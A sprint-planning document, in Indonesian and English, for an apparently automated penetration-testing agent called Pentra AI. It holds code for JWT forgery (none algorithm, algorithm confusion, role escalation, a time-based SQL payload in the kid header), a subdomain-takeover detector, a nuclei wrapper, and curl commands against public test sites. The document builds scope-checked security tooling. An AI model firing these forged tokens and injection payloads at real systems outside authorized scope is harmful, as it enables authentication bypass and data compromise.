# SPRINT-20.md — Pentra AI
> **Untuk:** GitHub Copilot dengan Claude Sonnet 4.6  
> **Baca terlebih dahulu:** `CLAUDE.md` → `PROGRESS.md` → file ini  
> **Status:** Sprint 19 ✅ 6/6, 268 tests, bge-m3 aktif, GraphQL+Race+CORS done  
> **Metodologi:** Security Eng + Systems Eng + Product Eng + Data Eng

---

## Analisis Status Platform Saat Ini

### Apa yang Sudah Sangat Baik

```
✅ 268 tests, 0 failed
✅ 9 tools paralel di vuln_hunt_node
✅ bge-m3 embedded 2,757 records
✅ GraphQL: introspection, SQLi, batch, DoS, mass assignment
✅ Race condition: HTTP/2 burst testing
✅ CORS: 6 origin probes
✅ WAF detection + bypass strategies
✅ Burp MCP 33 tools
✅ Two-stage triage (LLM + tool verify)
✅ ExploitArsenal per tech stack
✅ 5 scan presets + authenticated scan
✅ Located Memory (no forgetting)
✅ H1 Executive Report dengan LLM summary
```

### Gap Matrix — 4 Perspektif Engineering

```
SECURITY ENGINEERING           SYSTEMS ENGINEERING
─────────────────────────────  ─────────────────────────────────
❌ JWT/OAuth deep testing       ❌ Integration tests (hanya unit)
❌ Subdomain takeover detect   ❌ Circuit breaker per tool
❌ Second-order SQLi           ❌ Retry dengan exponential backoff
❌ HTTP Request Smuggling full  ❌ Tool output caching
❌ Cache poisoning              ❌ Structured error reporting
❌ Business logic (price manip) ⚠️ WAF bypass masih manual (detect saja)
❌ IDOR chain (multi-hop)       ⚠️ nuclei 0 findings belum di-fix sepenuhnya

PRODUCT ENGINEERING            DATA ENGINEERING
─────────────────────────────  ─────────────────────────────────
❌ E2E validation di DVWA       ❌ KB hanya 2,758 records (target 10k+)
❌ Authenticated scan E2E test  ❌ TechniqueEffectiveness tracking
❌ Frontend live feed test      ❌ Learning belum di-query di plan_node
❌ Custom GF pattern upload     ❌ Fine-tuning pipeline belum aktif
❌ Finding deduplication UI    ❌ Second-order injection patterns di KB
⚠️ report tidak include chain   ⚠️ RAG belum pakai EngagementLearning
```

### Prioritas Berdasarkan ROI

| Priority | Task | Effort | Bounty Value | Type |
|----------|------|--------|--------------|------|
| 🔴 P1 | JWT vulnerability testing | 3 jam | $2K–$20K | Security |
| 🔴 P1 | Subdomain takeover detection | 2 jam | $500–$5K | Security |
| 🔴 P1 | Nuclei 0-findings fix (final) | 2 jam | Unlocks 20+ findings | Bug Fix |
| 🟡 P2 | E2E validation DVWA | 2 jam | Validates all Sprint 18-19 | Testing |
| 🟡 P2 | KB scale-up to 5K+ | background | Better RAG | Data |
| 🟡 P2 | EngagementLearning di plan_node | 2 jam | Smarter planning | Intelligence |
| 🟢 P3 | Second-order SQLi | 2 jam | $1K–$5K | Security |
| 🟢 P3 | Business logic testing | 3 jam | $5K–$50K | Security |
| 🟢 P3 | Integration tests | 3 jam | Stability | Engineering |

---

## Task 20.1 — JWT Vulnerability Testing (P1)

> **Estimasi:** 3 jam  
> **Impact:** Pada 2025 saja, enam critical CVE menarget JWT implementations. Algorithm confusion attacks continue to compromise production systems. The "none" algorithm bypass persists despite decades of known vulnerability.  
> **Target vuln class:** JWT_VULNERABILITY → High/Critical severity

### Buat: `packages/pentra-tools/pentra_tools/vuln/jwt_tester.py`

```python
# packages/pentra-tools/pentra_tools/vuln/jwt_tester.py

"""
JWT Security Tester — comprehensive JWT vulnerability testing.
Attack vectors:
  1. "none" algorithm bypass
  2. Algorithm confusion (RS256 → HS256)
  3. Weak secret brute force
  4. kid parameter injection (SQL + path traversal)
  5. jku/x5u header injection (SSRF-style)
  6. Claims manipulation (role escalation)
  7. Expired token acceptance

References:
  - PortSwigger JWT Algorithm Confusion Labs
  - CVE-2025-4692 (algorithm confusion)
  - CVE-2025-30144 (signature verification bypass)
"""

import base64
import hashlib
import hmac
import json
import logging
import re
from dataclasses import dataclass

import httpx

logger = logging.getLogger(__name__)


@dataclass
class JWTFinding:
    title: str
    severity: str
    attack_type: str
    token_modified: str
    endpoint: str
    evidence: str
    remediation: str


def b64url_decode(s: str) -> bytes:
    """Base64URL decode dengan padding."""
    pad = 4 - len(s) % 4
    return base64.urlsafe_b64decode(s + "=" * pad)


def b64url_encode(b: bytes) -> str:
    """Base64URL encode tanpa padding."""
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Decode JWT tanpa verify. Return (header, payload, signature)."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def forge_none_algorithm(token: str, new_payload: dict | None = None) -> str:
    """
    Forge JWT dengan alg=none (no signature).
    Jika server accept = Critical auth bypass.
    """
    decoded = decode_jwt(token)
    if not decoded:
        return token

    _, payload, _ = decoded

    # Modify header: alg → none
    new_header = {"alg": "none", "typ": "JWT"}

    # Optionally modify payload (e.g., escalate role)
    if new_payload:
        payload.update(new_payload)

    header_b64 = b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    # Empty signature (or no signature at all)
    return f"{header_b64}.{payload_b64}."


def forge_hs256_with_public_key(token: str, public_key_pem: str) -> str:
    """
    Algorithm confusion: RS256 → HS256 menggunakan public key sebagai secret.
    Algorithm confusion attacks exploit implementations that don't properly
    validate the algorithm specified in the JWT header. The attacker changes the
    algorithm from RS256 to HS256, then signs with the public key as the HMAC secret.
    """
    decoded = decode_jwt(token)
    if not decoded:
        return token

    _, payload, _ = decoded

    # Change algorithm to HS256
    new_header = {"alg": "HS256", "typ": "JWT"}

    header_b64 = b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    # Sign with public key as HMAC secret
    message = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(
        public_key_pem.encode(),
        message,
        hashlib.sha256
    ).digest()

    return f"{header_b64}.{payload_b64}.{b64url_encode(signature)}"


def forge_role_escalation(token: str, role_field: str = "role", admin_value: str = "admin") -> str:
    """
    Modify payload untuk escalate role, keep original alg.
    Dipakai bersama none-algorithm atau weak secret attacks.
    """
    decoded = decode_jwt(token)
    if not decoded:
        return token

    header, payload, _ = decoded

    # Escalate role
    if role_field in payload:
        payload[role_field] = admin_value
    payload["is_admin"] = True
    payload["admin"] = True

    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    # Keep original signature (invalid but test if server still accepts)
    return f"{header_b64}.{payload_b64}.invalidsignature"


async def extract_jwt_from_response(response: httpx.Response) -> str | None:
    """Extract JWT dari response headers atau body."""
    # Authorization header
    auth = response.headers.get("authorization", "")
    if auth.startswith("Bearer "):
        return auth[7:]

    # Set-Cookie
    for cookie_str in response.headers.getlist("set-cookie"):
        # Look for JWT-like value in cookies
        for part in cookie_str.split(";"):
            val = part.strip().split("=", 1)
            if len(val) == 2:
                value = val[1]
                if value.count(".") == 2 and len(value) > 50:
                    decoded = decode_jwt(value)
                    if decoded:
                        return value

    # Response body JSON
    try:
        body = response.json()
        for key in ["token", "access_token", "jwt", "auth_token", "id_token"]:
            if key in body:
                return body[key]
    except Exception:
        pass

    return None


async def test_jwt_vulnerabilities(
    base_url: str,
    auth_headers: dict | None = None,
    known_jwt: str | None = None,
    scope_check_fn=None,
) -> list[dict]:
    """
    Main JWT testing function.
    1. Discover endpoints yang return JWT
    2. Test none-algorithm bypass
    3. Test role escalation
    4. Test algorithm confusion (jika public key tersedia)

    Returns list of Pentra AI finding dicts.
    """
    if scope_check_fn and not scope_check_fn(base_url):
        return []

    findings = []
    test_jwt = known_jwt

    # JWT-common endpoints
    JWT_ENDPOINTS = [
        "/api/user", "/api/me", "/api/profile", "/api/v1/me",
        "/api/v1/user", "/v1/user", "/me", "/profile",
        "/api/auth/refresh", "/auth/refresh",
    ]

    async with httpx.AsyncClient(
        verify=False,
        follow_redirects=True,
        timeout=10.0,
    ) as client:

        req_headers = auth_headers or {}

        # Step 1: Try to collect a JWT if not provided
        if not test_jwt:
            for path in JWT_ENDPOINTS:
                url = base_url.rstrip("/") + path
                try:
                    resp = await client.get(url, headers=req_headers)
                    jwt = await extract_jwt_from_response(resp)
                    if jwt:
                        test_jwt = jwt
                        logger.info("[jwt] Found JWT at %s", url)
                        break
                except Exception:
                    pass

        if not test_jwt:
            logger.debug("[jwt] No JWT found to test")
            return []

        decoded = decode_jwt(test_jwt)
        if not decoded:
            return []

        header, payload, _ = decoded
        alg = header.get("alg", "").upper()
        logger.info("[jwt] Testing JWT: alg=%s sub=%s", alg, payload.get("sub", "?"))

        # Step 2: None algorithm attack
        logger.info("[jwt] Testing none algorithm bypass...")
        none_token = forge_none_algorithm(test_jwt, new_payload={"role": "admin"})

        for path in JWT_ENDPOINTS[:3]:
            url = base_url.rstrip("/") + path
            try:
                resp = await client.get(
                    url,
                    headers={**req_headers, "Authorization": f"Bearer {none_token}"},
                )
                # Jika server return 200 dengan forged none token = CRITICAL
                if resp.status_code == 200:
                    findings.append({
                        "title": "JWT None Algorithm Authentication Bypass",
                        "severity": "critical",
                        "vuln_class": "JWT_VULNERABILITY",
                        "target_url": url,
                        "description": (
                            "Server accepted a JWT with 'alg: none' (no signature). "
                            "This allows an attacker to forge tokens for any user "
                            "without knowing the secret key."
                        ),
                        "request_raw": f"GET {url}\nAuthorization: Bearer {none_token[:80]}...",
                        "response_raw": resp.text[:300],
                        "source": "jwt_tester",
                        "remediation": (
                            "Explicitly reject 'none' algorithm on server side. "
                            "Maintain a strict server-side allowlist of accepted algorithms."
                        ),
                    })
                    logger.info("[jwt] NONE ALGORITHM BYPASS CONFIRMED at %s", url)
                    break
            except Exception:
                pass

        # Step 3: Invalid signature acceptance
        logger.info("[jwt] Testing invalid signature acceptance...")
        invalid_sig_token = forge_role_escalation(test_jwt)

        for path in JWT_ENDPOINTS[:3]:
            url = base_url.rstrip("/") + path
            try:
                resp = await client.get(
                    url,
                    headers={**req_headers, "Authorization": f"Bearer {invalid_sig_token}"},
                )
                if resp.status_code == 200:
                    findings.append({
                        "title": "JWT Signature Not Verified",
                        "severity": "critical",
                        "vuln_class": "JWT_VULNERABILITY",
                        "target_url": url,
                        "description": (
                            "Server accepted a JWT with an invalid/forged signature. "
                            "Token signature verification is not implemented."
                        ),
                        "request_raw": f"GET {url}\nAuthorization: Bearer {invalid_sig_token[:80]}...",
                        "response_raw": resp.text[:300],
                        "source": "jwt_tester",
                        "remediation": (
                            "Always verify JWT signatures server-side. "
                            "Never trust unsigned or self-signed tokens."
                        ),
                    })
                    logger.info("[jwt] INVALID SIGNATURE ACCEPTED at %s", url)
                    break
            except Exception:
                pass

        # Step 4: kid SQL injection
        if "kid" in header:
            logger.info("[jwt] kid parameter found — testing injection...")
            header_injected = {**header, "kid": "'; SELECT SLEEP(5)--"}
            h64 = b64url_encode(json.dumps(header_injected, separators=(",", ":")).encode())
            p64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            kid_sqli_token = f"{h64}.{p64}.invalidsig"

            import time
            for path in JWT_ENDPOINTS[:2]:
                url = base_url.rstrip("/") + path
                try:
                    start = time.monotonic()
                    resp = await client.get(
                        url,
                        headers={**req_headers, "Authorization": f"Bearer {kid_sqli_token}"},
                    )
                    elapsed = time.monotonic() - start
                    if elapsed >= 4.5:
                        findings.append({
                            "title": "JWT kid Parameter SQL Injection (Time-Based)",
                            "severity": "high",
                            "vuln_class": "JWT_VULNERABILITY",
                            "target_url": url,
                            "description": (
                                f"JWT 'kid' parameter is injectable. "
                                f"Time delay of {elapsed:.1f}s confirms SQL injection."
                            ),
                            "request_raw": f"kid header: {header_injected['kid']}",
                            "response_raw": f"Response time: {elapsed:.1f}s (expected <1s)",
                            "source": "jwt_tester",
                            "remediation": (
                                "Sanitize and validate the 'kid' parameter. "
                                "Use parameterized queries for key lookup."
                            ),
                        })
                        break
                except Exception:
                    pass

    return findings
```

### Tests JWT Tester

```python
# packages/pentra-tools/tests/test_jwt_tester.py

import pytest
from pentra_tools.vuln.jwt_tester import (
    decode_jwt, forge_none_algorithm, forge_role_escalation, b64url_encode
)
import json, base64


def make_fake_jwt(header: dict, payload: dict, sig: str = "fakesig") -> str:
    def b64(d):
        return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=").decode()
    return f"{b64(header)}.{b64(payload)}.{sig}"


def test_decode_valid_jwt():
    token = make_fake_jwt({"alg": "HS256", "typ": "JWT"}, {"sub": "user1", "role": "user"})
    result = decode_jwt(token)
    assert result is not None
    header, payload, sig = result
    assert header["alg"] == "HS256"
    assert payload["sub"] == "user1"


def test_decode_invalid_returns_none():
    assert decode_jwt("not.a.valid.jwt.token") is None
    assert decode_jwt("onlytwoparts.here") is None


def test_forge_none_algorithm():
    token = make_fake_jwt({"alg": "HS256"}, {"sub": "user", "role": "user"})
    forged = forge_none_algorithm(token, {"role": "admin"})
    parts = forged.split(".")
    assert len(parts) == 3
    # Decode forged header
    import json, base64
    h = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    assert h["alg"] == "none"
    # Signature should be empty
    assert parts[2] == ""


def test_forge_role_escalation():
    token = make_fake_jwt({"alg": "HS256"}, {"sub": "user", "role": "user"})
    forged = forge_role_escalation(token, role_field="role", admin_value="admin")
    _, payload_b64, sig = forged.split(".")
    payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
    assert payload["role"] == "admin"
    assert payload["is_admin"] is True
    assert sig == "invalidsignature"


def test_none_alg_token_is_valid_structure():
    token = make_fake_jwt({"alg": "RS256"}, {"sub": "1", "exp": 9999999999})
    none_tok = forge_none_algorithm(token)
    parts = none_tok.split(".")
    assert len(parts) == 3
    # Header should decode cleanly
    h = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    assert h["alg"] == "none"
```

### Integrasi ke vuln_hunt_node.py

```python
# packages/pentra-agent/pentra_agent/nodes/vuln_hunt_node.py
# Tambahkan ke parallel tool list:

from pentra_tools.vuln.jwt_tester import test_jwt_vulnerabilities

# Di run_concurrent_tools():
jwt_findings = await test_jwt_vulnerabilities(
    base_url=f"http://{domain}",
    auth_headers=state.get("auth_headers"),
    known_jwt=_extract_jwt_from_state(state),
    scope_check_fn=scope.is_allowed,
)
if jwt_findings:
    logger.info("[vuln_hunt] JWT: %d findings", len(jwt_findings))
    all_findings.extend(jwt_findings)


def _extract_jwt_from_state(state: dict) -> str | None:
    """Cari JWT di auth_headers atau dari Burp proxy history."""
    auth_headers = state.get("auth_headers", {})
    auth = auth_headers.get("Authorization", "")
    if auth.startswith("Bearer "):
        return auth[7:]
    return None
```

---

## Task 20.2 — Subdomain Takeover Detection (P1)

> **Estimasi:** 2 jam  
> **Impact:** Subdomain takeover terjadi saat DNS entry masih menunjuk ke third-party service yang sudah didecommission tapi belum dilepas. Tools seperti SubOver atau nuclei dipakai untuk mendeteksi secara otomatis.

### Buat: `packages/pentra-tools/pentra_tools/recon/takeover_detector.py`

```python
# packages/pentra-tools/pentra_tools/recon/takeover_detector.py

"""
Subdomain Takeover Detector.
Cek dangling CNAME records yang menunjuk ke service yang sudah tidak ada.

Based on:
- can-i-take-over-xyz fingerprints (EdOverflow)
- nuclei takeover templates
- BadDNS methodology
"""

import asyncio
import logging
from dataclasses import dataclass

import httpx

logger = logging.getLogger(__name__)


@dataclass
class TakeoverFinding:
    subdomain: str
    cname_target: str
    service: str
    severity: str
    fingerprint: str
    confidence: str   # "certain" | "likely" | "possible"


# Fingerprints dari can-i-take-over-xyz + nuclei takeover templates
TAKEOVER_FINGERPRINTS: dict[str, dict] = {
    "github_pages": {
        "cname_patterns": ["github.io", "github.com"],
        "fingerprint": "There isn't a GitHub Pages site here",
        "service": "GitHub Pages",
        "severity": "high",
    },
    "heroku": {
        "cname_patterns": ["herokuapp.com", "herokuapp.com"],
        "fingerprint": "No such app",
        "service": "Heroku",
        "severity": "high",
    },
    "aws_s3": {
        "cname_patterns": ["s3.amazonaws.com", "s3-website"],
        "fingerprint": "NoSuchBucket",
        "service": "AWS S3",
        "severity": "high",
    },
    "netlify": {
        "cname_patterns": ["netlify.app", "netlify.com"],
        "fingerprint": "Not Found - Request ID",
        "service": "Netlify",
        "severity": "medium",
    },
    "vercel": {
        "cname_patterns": ["vercel.app", "now.sh"],
        "fingerprint": "The deployment you are trying to access does not exist",
        "service": "Vercel",
        "severity": "medium",
    },
    "azure": {
        "cname_patterns": ["azurewebsites.net", "cloudapp.azure.com", "trafficmanager.net"],
        "fingerprint": "404 Web Site not found",
        "service": "Azure App Service",
        "severity": "high",
    },
    "shopify": {
        "cname_patterns": ["myshopify.com"],
        "fingerprint": "Sorry, this shop is currently unavailable",
        "service": "Shopify",
        "severity": "medium",
    },
    "fastly": {
        "cname_patterns": ["fastly.net"],
        "fingerprint": "Fastly error: unknown domain",
        "service": "Fastly",
        "severity": "medium",
    },
    "pantheon": {
        "cname_patterns": ["pantheonsite.io"],
        "fingerprint": "The gods are wise, but do not know of the site",
        "service": "Pantheon",
        "severity": "medium",
    },
    "wordpress": {
        "cname_patterns": ["wordpress.com"],
        "fingerprint": "Do you want to register",
        "service": "WordPress.com",
        "severity": "medium",
    },
    "ghost": {
        "cname_patterns": ["ghost.io"],
        "fingerprint": "The thing you were looking for is no longer here",
        "service": "Ghost",
        "severity": "medium",
    },
    "bitbucket": {
        "cname_patterns": ["bitbucket.io"],
        "fingerprint": "Repository not found",
        "service": "Bitbucket",
        "severity": "medium",
    },
}


async def check_dns_cname(domain: str) -> str | None:
    """Resolve CNAME record untuk domain. Return CNAME target atau None."""
    import dns.resolver
    try:
        result = dns.resolver.resolve(domain, "CNAME")
        return str(result[0].target).rstrip(".")
    except Exception:
        return None


async def check_takeover_fingerprint(
    subdomain: str,
    cname: str,
    client: httpx.AsyncClient,
) -> TakeoverFinding | None:
    """
    Cek apakah subdomain vulnerable ke takeover berdasarkan CNAME dan fingerprint.
    """
    for service_name, config in TAKEOVER_FINGERPRINTS.items():
        # Cek apakah CNAME menunjuk ke service ini
        if not any(pattern in cname.lower() for pattern in config["cname_patterns"]):
            continue

        # Fetch subdomain dan cek fingerprint
        try:
            for scheme in ["https", "http"]:
                url = f"{scheme}://{subdomain}"
                try:
                    resp = await client.get(url, timeout=8.0)
                    body = resp.text

                    if config["fingerprint"].lower() in body.lower():
                        logger.info(
                            "[takeover] VULNERABLE: %s → %s (%s)",
                            subdomain, cname, config["service"]
                        )
                        return TakeoverFinding(
                            subdomain=subdomain,
                            cname_target=cname,
                            service=config["service"],
                            severity=config["severity"],
                            fingerprint=config["fingerprint"],
                            confidence="certain",
                        )
                except httpx.ConnectError:
                    # NXDOMAIN atau connection refused = possible takeover
                    if service_name == "aws_s3":
                        return TakeoverFinding(
                            subdomain=subdomain,
                            cname_target=cname,
                            service=config["service"],
                            severity=config["severity"],
                            fingerprint="NXDOMAIN/Connection refused",
                            confidence="likely",
                        )
                except Exception:
                    pass
        except Exception:
            pass

    return None


async def detect_subdomain_takeovers(
    subdomains: list[str],
    scope_check_fn=None,
) -> list[dict]:
    """
    Run takeover detection untuk semua subdomains.
    Return list of Pentra AI finding dicts.
    """
    try:
        import dns.resolver  # dnspython required
    except ImportError:
        logger.warning("[takeover] dnspython not installed — skipping takeover detection")
        return []

    findings = []

    async with httpx.AsyncClient(verify=False, follow_redirects=False) as client:
        tasks = []
        for sub in subdomains:
            if scope_check_fn and not scope_check_fn(f"http://{sub}"):
                continue
            tasks.append(_check_single(sub, client))

        results = await asyncio.gather(*tasks, return_exceptions=True)

    for result in results:
        if isinstance(result, TakeoverFinding):
            findings.append({
                "title": f"Subdomain Takeover — {result.subdomain} ({result.service})",
                "severity": result.severity,
                "vuln_class": "SUBDOMAIN_TAKEOVER",
                "target_url": f"https://{result.subdomain}",
                "description": (
                    f"Subdomain {result.subdomain} has a dangling CNAME pointing to "
                    f"{result.cname_target} ({result.service}). "
                    f"The resource is no longer claimed, allowing an attacker to take control."
                ),
                "request_raw": f"CNAME: {result.subdomain} → {result.cname_target}",
                "response_raw": f"Fingerprint found: '{result.fingerprint}' (confidence: {result.confidence})",
                "source": "takeover_detector",
                "remediation": (
                    "Remove the dangling DNS CNAME record, or re-register the resource "
                    f"on {result.service} before an attacker does."
                ),
            })

    if findings:
        logger.info("[takeover] %d subdomain takeover(s) detected", len(findings))

    return findings


async def _check_single(subdomain: str, client: httpx.AsyncClient) -> TakeoverFinding | None:
    cname = await check_dns_cname(subdomain)
    if not cname:
        return None
    return await check_takeover_fingerprint(subdomain, cname, client)
```

### Tests

```python
# packages/pentra-tools/tests/test_takeover_detector.py

import pytest
from unittest.mock import AsyncMock, patch, MagicMock


def test_takeover_fingerprints_have_required_fields():
    from pentra_tools.recon.takeover_detector import TAKEOVER_FINGERPRINTS
    for name, config in TAKEOVER_FINGERPRINTS.items():
        assert "cname_patterns" in config, f"{name} missing cname_patterns"
        assert "fingerprint" in config, f"{name} missing fingerprint"
        assert "service" in config, f"{name} missing service"
        assert config.get("severity") in ("high", "medium", "low"), f"{name} invalid severity"


@pytest.mark.asyncio
async def test_check_fingerprint_github_pages():
    """GitHub Pages fingerprint harus terdeteksi."""
    mock_resp = MagicMock()
    mock_resp.text = "<p>There isn't a GitHub Pages site here</p>"
    mock_resp.status_code = 404

    with patch("httpx.AsyncClient") as mock_cls:
        mock_c = AsyncMock()
        mock_c.__aenter__ = AsyncMock(return_value=mock_c)
        mock_c.__aexit__ = AsyncMock(return_value=False)
        mock_c.get = AsyncMock(return_value=mock_resp)
        mock_cls.return_value = mock_c

        from pentra_tools.recon.takeover_detector import check_takeover_fingerprint
        result = await check_takeover_fingerprint(
            "blog.target.com",
            "target-org.github.io",
            mock_c,
        )

    assert result is not None
    assert result.service == "GitHub Pages"
    assert result.confidence == "certain"


@pytest.mark.asyncio
async def test_no_fingerprint_returns_none():
    """Normal site tanpa fingerprint harus return None."""
    mock_resp = MagicMock()
    mock_resp.text = "<html><body>Normal site</body></html>"
    mock_resp.status_code = 200

    with patch("httpx.AsyncClient") as mock_cls:
        mock_c = AsyncMock()
        mock_c.__aenter__ = AsyncMock(return_value=mock_c)
        mock_c.__aexit__ = AsyncMock(return_value=False)
        mock_c.get = AsyncMock(return_value=mock_resp)
        mock_cls.return_value = mock_c

        from pentra_tools.recon.takeover_detector import check_takeover_fingerprint
        result = await check_takeover_fingerprint(
            "blog.target.com",
            "target-org.github.io",
            mock_c,
        )

    assert result is None
```

### Integrasi ke recon_node.py

```python
# packages/pentra-agent/pentra_agent/nodes/recon_node.py
# Tambahkan setelah subdomain enumeration selesai:

from pentra_tools.recon.takeover_detector import detect_subdomain_takeovers

subdomain_hosts = [s["host"] for s in all_subdomains if s.get("host")]
if subdomain_hosts:
    takeover_findings = await detect_subdomain_takeovers(
        subdomains=subdomain_hosts,
        scope_check_fn=scope.is_allowed,
    )
    if takeover_findings:
        # Simpan di state untuk diproses triage_node
        state_update["early_findings"] = takeover_findings
        logger.info("[recon_node] Takeover: %d candidates found", len(takeover_findings))
```

---

## Task 20.3 — Fix Nuclei 0 Findings (Final)

> **Estimasi:** 2 jam — diagnosa dulu, baru fix

### Diagnosa Script (jalankan manual dulu)

```bash
# Step 1: Test nuclei manual untuk pastikan binary OK
nuclei -version
nuclei -u http://testaspnet.vulnweb.com/ \
  -tags sqli -timeout 10 -silent -j | head -20

# Bandingkan HTTP vs HTTPS
nuclei -u https://testaspnet.vulnweb.com/ -tags sqli -silent | head -5
nuclei -u http://testaspnet.vulnweb.com/ -tags sqli -silent | head -5

# Step 2: Update templates
nuclei -update-templates -silent
echo "Templates: $(ls ~/.local/nuclei-templates/ 2>/dev/null | wc -l)"
```

### Fix di vuln_hunt_node.py

```python
# packages/pentra-agent/pentra_agent/nodes/vuln_hunt_node.py
# Cari _run_nuclei() atau setara:

async def _run_nuclei(url_targets: list[str], tech_stack: list[str]) -> list[dict]:
    """
    Run nuclei scan dengan HTTPS→HTTP fallback dan IIS/ASP-aware tags.
    """
    # 1. HTTPS→HTTP fallback (bug dari Sprint 12 yang masih perlu di-verify)
    probed_targets = []
    for url in url_targets:
        if url.startswith("https://"):
            host = url.replace("https://", "").split("/")[0]
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, 443), timeout=5.0
                )
                writer.close()
                probed_targets.append(url)
            except Exception:
                http_url = url.replace("https://", "http://")
                probed_targets.append(http_url)
                logger.info("[nuclei] HTTPS port 443 closed → using %s", http_url)
        else:
            probed_targets.append(url)

    # 2. Tech-aware tags
    base_tags = ["sqli", "xss", "lfi", "rce", "ssrf", "exposure", "misconfig", "cve"]
    tech_lower = " ".join(t.lower() for t in tech_stack)

    if "iis" in tech_lower or "asp.net" in tech_lower:
        base_tags.extend(["iis", "asp"])
    if "wordpress" in tech_lower or "wp" in tech_lower:
        base_tags.extend(["wordpress", "wp-plugin"])
    if "nginx" in tech_lower:
        base_tags.append("nginx")
    if "apache" in tech_lower:
        base_tags.append("apache")

    tags_str = ",".join(set(base_tags))

    # 3. Build command
    nuclei_bin = shutil.which("nuclei") or "/home/mdilab/go/bin/nuclei"
    cmd = [
        nuclei_bin,
        "-u", probed_targets[0] if probed_targets else url_targets[0],
        "-tags", tags_str,
        "-timeout", "15",        # Naikan dari 10
        "-c", "10",
        "-j",                    # JSON output
        "-silent",
        "-ni",                   # No interactsh
        "-duc",                  # Disable update check
    ]

    logger.info("[nuclei] Running: targets=%s tags=%s", probed_targets[:2], tags_str)

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=600)
        stdout_str = stdout.decode()
        stderr_str = stderr.decode()

        # Parse JSON output
        findings = []
        for line in stdout_str.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                item = json.loads(line)
                findings.append({
                    "title": item.get("info", {}).get("name", "Nuclei Finding"),
                    "severity": item.get("info", {}).get("severity", "info").lower(),
                    "vuln_class": item.get("type", "UNKNOWN").upper(),
                    "target_url": item.get("matched-at", item.get("host", "")),
                    "description": item.get("info", {}).get("description", ""),
                    "source": "nuclei",
                    "template_id": item.get("template-id", ""),
                })
            except json.JSONDecodeError:
                pass

        # Verbose log jika 0 findings
        if not findings:
            logger.warning(
                "[nuclei] 0 findings! targets=%s stderr=%s stdout_len=%d",
                probed_targets[:2], stderr_str[:200], len(stdout_str)
            )

        logger.info("[nuclei] %d findings (exit=%d)", len(findings), proc.returncode)
        return findings

    except asyncio.TimeoutError:
        logger.warning("[nuclei] Timed out after 600s")
        return []
```

---

## Task 20.4 — E2E Validation (DVWA + testfire)

> **Manual execution — tidak perlu Copilot**  
> **Estimasi:** 2 jam

```bash
# Pilih target untuk E2E:
# Option A: testaspnet.vulnweb.com (proven dari Sprint 12-16)
# Option B: testphp.vulnweb.com (PHP stack untuk test SQLi MySQL)
# Option C: DVWA lokal (untuk test authenticated scan)

# ── Option A: testaspnet ──────────────────────────────────────────────────
TOKEN=$(curl -sX POST http://localhost:8001/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Pentra@2026!"}' | jq -r .access_token)

ENG_ID=$(curl -sX POST http://localhost:8001/api/v1/engagements \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "E2E-Sprint20-Validation",
    "workspace_id": "'$WS_ID'",
    "mode": "semi_auto",
    "in_scope": ["testaspnet.vulnweb.com"],
    "llm_model": "qwen2.5:32b"
  }' | jq -r .id)

# Start
curl -sX POST http://localhost:8001/api/v1/engagements/$ENG_ID/start \
  -H "Authorization: Bearer $TOKEN"

# Monitor dengan filter Sprint 20 features
tail -f /tmp/pentra.log | grep -E \
  "jwt_tester|takeover|none algorithm|SUBDOMAIN_TAKEOVER|\
  JWT_VULNERABILITY|nuclei.*findings|HTTPS.*HTTP|takeover_detector"

# Expected setelah fix:
# [jwt_tester] Testing JWT at testaspnet...
# [takeover] Checking X subdomains for dangling CNAME
# [nuclei] 15+ findings (bukan 0)
```

---

## Task 20.5 — KB Scale-Up ke 5,000+ Records

> **Manual — jalankan via API setelah API up**  
> **Bisa berjalan di background**

```bash
# Trigger H1 bulk import pages 21-60
curl -sX POST http://localhost:8001/api/v1/admin/knowledge/bulk-import \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"source":"h1_graphql","max_records":2500,"start_page":21}'

# Monitor progress
watch -n 60 '
  curl -s http://localhost:6333/collections/knowledge | \
  jq ".result.points_count" | \
  xargs -I{} echo "KB records: {}"
'

# Target: 5,000+ records dalam 2-3 jam
```

---

## Task 20.6 — EngagementLearning di plan_node

> **Estimasi:** 2 jam  
> **Impact:** Agent plan lebih kontekstual berdasarkan history

```python
# packages/pentra-agent/pentra_agent/nodes/plan_node.py
# Tambahkan learning query sebelum generate plan:

from pentra_agent.utils.learning_query import query_similar_learnings

async def plan_node(state: PentraState) -> dict:
    # ... existing code ...

    # Query learnings dari engagement serupa
    domain = state["target"]["domain"]
    tech_stack = state.get("tech_stack", [])  # Mungkin masih kosong di plan phase

    past_learnings = await query_similar_learnings(
        tech_stack=tech_stack,
        domain_pattern=_extract_domain_pattern(domain),
        db_url=os.getenv("DATABASE_URL"),
    )

    if past_learnings:
        learning_context = "\n".join(
            f"Past engagement on similar target: {l.effective_tools} found {l.findings_count} findings. "
            f"High-value endpoints: {[ep.get('pattern') for ep in l.high_value_endpoints[:3]]}"
            for l in past_learnings[:3]
        )
        logger.info(
            "[plan_node] Found %d past learnings for context", len(past_learnings)
        )
    else:
        learning_context = ""
